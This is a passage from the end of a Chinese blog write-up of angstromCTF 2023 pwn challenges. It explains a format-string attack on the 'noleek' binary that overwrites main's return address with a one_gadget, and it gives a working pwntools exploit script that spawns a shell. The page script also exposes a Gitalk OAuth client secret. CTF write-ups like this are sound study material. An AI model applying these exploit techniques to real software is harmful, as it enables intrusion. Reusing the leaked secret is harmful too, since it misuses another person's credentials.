+<p>输入下面的格式化字符串，先打印第16个参数低4字节（0x0b7e57cf）个字符，然后打印674449个参数，最后它两之和（也就是<code>one_gadget</code>真实地址的低4字节）覆写第42个参数的低4字节，即将<code>main_ret</code>（0x7fa20b7e5d0a）修改为one_gadget的地址，最终拿到shell。</p>
+<blockquote>
+<p>回顾一下格式化占位符（format placeholder）的语法：</p>
+<p><code>%[parameter][flags][field width][.precision][length]type</code></p>
+<ul>
+<li><strong>Parameter</strong>可以忽略或者是<code>n$</code>：<em>n</em>是用这个格式说明符（specifier）显示第几个参数</li>
+</ul>
+</blockquote>
+<pre><code class="language-shell">%*16$c%674449c%42$n
+
+分开解读：
+%*16$c    打印第16个参数低4Byte个字符（这个16$和后面的42$是一个概念）
+%674449c  打印674449个字符
+%42$n     将前面打印的字符数写入第42个参数
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230716182735.png" alt="image-20230716175930208" loading="lazy"></figure>
+<h2 id="63-exp">6.3 exp</h2>
+<pre><code class="language-shell">%*c%56c%13$hn
+
+%*16$c%674449c%42$n
+</code></pre>
+<p>不是每次都能成功，调试过程中我发现有时候输入以后，它会把第13个参数改成一个不知道是什么的数字。这时候我会重新输入<code>%*c%13$hn</code>，然后多试几次就ok。所以如果写成python脚本，也是用一个死循环来多试几次：</p>
+<pre><code class="language-python">from pwn import *
+import warnings
+import subprocess
+
+warnings.filterwarnings(action='ignore', category=BytesWarning)
+
+s       = lambda data               :p.send(data)
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+ruf     = lambda delims, drop=False :p.recvuntil(delims, drop)
+rl      = lambda drop=True          :p.recvline(drop)
+rlf     = lambda drop=False         :p.recvline(drop)
+uu64    = lambda data               :u64(data.ljust(8,'\x00'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+logsucc = lambda info               :log.success(info)
+itr     = lambda                    :p.interactive()
+
+context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序
+context.log_level = 'DEBUG'
+# context.log_level = 'CRITICAL'
+#context.terminal=['tmux', 'spilit-window', '-h']
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+
+def dbg():
+    gdb.attach(p)
+    # pause()
+
+elf = ELF(&quot;./noleek&quot;)
+
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;)
+
+while True:
+    try:
+        p = process(&quot;./noleek&quot;)
+        # gdb.attach(p, &quot;&quot;&quot;b *(main+140)&quot;&quot;&quot;)
+        # payload = f'%*c%29$hn'
+        payload = f'%*c%{0x38}c%13$hn'.encode()
+        sla(b&quot;leek? &quot;, payload)
+
+        payload = f'%*16$c%{0xa4a91}c%42$n'.encode()
+        sla(b&quot;more leek? &quot;, payload)
+
+        ru(b'noleek.\n')
+                
+        sl(b'cat flag.txt')
+        flag = rl()
+        print(flag)
+    except:
+        p.close()
+        continue
+    break    
+
+itr()
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230716182648.png" alt="image-20230716182631677" loading="lazy"></figure>
+<h1 id="7-sailors-revenge">7 Sailor's Revenge</h1>
+<blockquote>
+<p>After the sailors were betrayed by their trusty anchor, they rewrote their union smart contract to be anchor-free! They even added a new registration feature so you can show off your union registration on the blockchain!</p>
+</blockquote>
+<p>智能合约，不会，正打算学这个。后面再补这题吧。</p>
+<h1 id="小结">小结</h1>
+<ul>
+<li>这些题主要是栈溢出和格式化字符串漏洞</li>
+<li>对于输入有长度限制的时候，注意<code>sendlineafter</code>和<code>sendafter</code>，不然容易卡在这个小细节里。</li>
+<li>格式化字符串，网上稍微搜了搜，还是<a href="https://zh.m.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">维基百科</a>介绍得最详细。</li>
+</ul>
+<h1 id="参考文献">参考文献</h1>
+<ul>
+<li>https://www.youtube.com/watch?v=jqF4Sgi4Ars</li>
+<li>https://zh.m.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2</li>
+<li>https://github.com/nhtri2003gmail/CTFWriteup/blob/5b229bc581e7474f67de0617cb4fc40fbb20e70d/2023/angstromCTF/noleek/README.md</li>
+</ul>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                <ul class="markdownIt-TOC">
+<li><a href="#1-queue">1 queue</a>
+<ul>
+<li><a href="#11-%E8%BF%90%E8%A1%8C">1.1 运行</a></li>
+<li><a href="#12-%E5%8F%8D%E7%BC%96%E8%AF%91">1.2 反编译</a></li>
+<li><a href="#13-%E8%B0%83%E8%AF%95">1.3 调试</a></li>
+<li><a href="#14-exp">1.4 exp</a></li>
+</ul>
+</li>
+<li><a href="#2-gaga">2 gaga</a>
+<ul>
+<li><a href="#21-%E8%BF%90%E8%A1%8C">2.1 运行</a></li>
+<li><a href="#22-%E5%8F%8D%E7%BC%96%E8%AF%91%E5%88%86%E6%9E%90">2.2 反编译&amp;分析</a>
+<ul>
+<li><a href="#gaga0">gaga0</a>
+<ul>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+<li><a href="#gaga1">gaga1</a></li>
+<li><a href="#gaga2">gaga2</a></li>
+</ul>
+</li>
+<li><a href="#23-%E8%B0%83%E8%AF%95">2.3 调试</a></li>
+</ul>
+</li>
+<li><a href="#3-leek">3 leek</a>
+<ul>
+<li><a href="#31-%E8%BF%90%E8%A1%8C">3.1 运行</a></li>
+<li><a href="#32-%E5%8F%8D%E7%BC%96%E8%AF%91">3.2 反编译</a></li>
+<li><a href="#33-exp">3.3 exp</a></li>
+</ul>
+</li>
+<li><a href="#4-widget">4 widget</a>
+<ul>
+<li><a href="#41-%E8%BF%90%E8%A1%8C">4.1 运行</a></li>
+<li><a href="#42-%E5%8F%8D%E7%BC%96%E8%AF%91">4.2 反编译</a></li>
+<li><a href="#43-exp">4.3 exp</a></li>
+<li><a href="#44-exp2">4.4 exp2</a></li>
+</ul>
+</li>
+<li><a href="#5-slack">5 slack</a>
+<ul>
+<li><a href="#51-%E8%BF%90%E8%A1%8C">5.1 运行</a></li>
+<li><a href="#52-%E5%8F%8D%E7%BC%96%E8%AF%91">5.2 反编译</a></li>
+<li><a href="#53-%E8%B0%83%E8%AF%95">5.3 调试</a>
+<ul>
+<li><a href="#531-%E6%B3%84%E9%9C%B2%E6%A0%88%E5%9C%B0%E5%9D%80%E5%92%8Clibc%E5%9C%B0%E5%9D%80">5.3.1 泄露栈地址和libc地址</a></li>
+<li><a href="#532-%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8Fi%E7%9A%84%E5%80%BC%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%A4%A7%E8%B4%9F%E6%95%B0">5.3.2 修改变量i的值为一个大负数</a></li>
+<li><a href="#533-%E8%A6%86%E5%86%99main_ret%E4%B8%BArop%E9%93%BE">5.3.3 覆写<code>main_ret</code>为rop链</a></li>
+</ul>
+</li>
+<li><a href="#54-exp">5.4 exp</a></li>
+</ul>
+</li>
+<li><a href="#6-noleek">6 noleek</a>
+<ul>
+<li><a href="#61-%E8%BF%90%E8%A1%8C%E5%88%86%E6%9E%90">6.1 运行分析</a>
+<ul>
+<li><a href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8">格式化字符串中<code>*</code>的作用</a></li>
+</ul>
+</li>
+<li><a href="#62-%E8%B0%83%E8%AF%95">6.2 调试</a></li>
+<li><a href="#63-exp">6.3 exp</a></li>
+</ul>
+</li>
+<li><a href="#7-sailors-revenge">7 Sailor's Revenge</a></li>
+<li><a href="#%E5%B0%8F%E7%BB%93">小结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE">参考文献</a></li>
+</ul>
+
+                            </div>
+                            
+                                
+                                    
+                                            <!--zh-->
+                                            <section class="post-copyright zh">
+                                                <p class="copyright-item ">
+                                                    <span>&#x4F5C;&#x8005;:</span>
+                                                    <span>ztree</span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x6C38;&#x4E45;&#x94FE;&#x63A5;:</span>
+                                                    <span><a href="https://lzxzl.github.io/post/angstromctf2023-pwn/">https://lzxzl.github.io/post/angstromctf2023-pwn/</a></span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x534F;&#x8BAE;:</span>
+                                                    <span>MIT License</span>
+                                                </p>
+                                            </section>
+                                            
+                                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://lzxzl.github.io/post/angstromctf2023-pwn/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://lzxzl.github.io/post/angstromctf2023-pwn/&sharesource=qzone&title=angstromctf2023 - pwn&pics=https://lzxzl.github.io/images/avatar.png?v=1747748455692&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://lzxzl.github.io/post/angstromctf2023-pwn/&sharesource=weibo&title=angstromctf2023 - pwn + " - " + &pic="https://lzxzl.github.io/images/avatar.png?v=1747748455692 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                        
+                        <a href="https://lzxzl.github.io/tag/ctf/">#
+                    ctf
+                        </a>
+                        
+                            
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://lzxzl.github.io/post/aosp-shang-de-libfuzzer-chang-shi/">
+                                                                                            AOSP上的libfuzzer尝试
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://lzxzl.github.io/post/syzkaller-shi-yong-linux/">
+                                                                                                    syzkaller使用-Linux
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '2a44a295dd16ae7d05b8',
+        clientSecret: '8030257bc11446a193cf383767567daca0e26312',
+        repo: 'lzxzl.github.io',
+        owner: 'lzxzl',
+        admin: ['lzxzl'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        ztree
+                            
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                        ztree &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://lzxzl.github.io/" target="_blank">
+                                                ztree
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                off
+            </div>
+            
+                    <script>
+                        var port = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + port + '</div>')
+                    </script>
+        </footer>
+        
+                <script>
+                    
+                    
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1747748455692);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
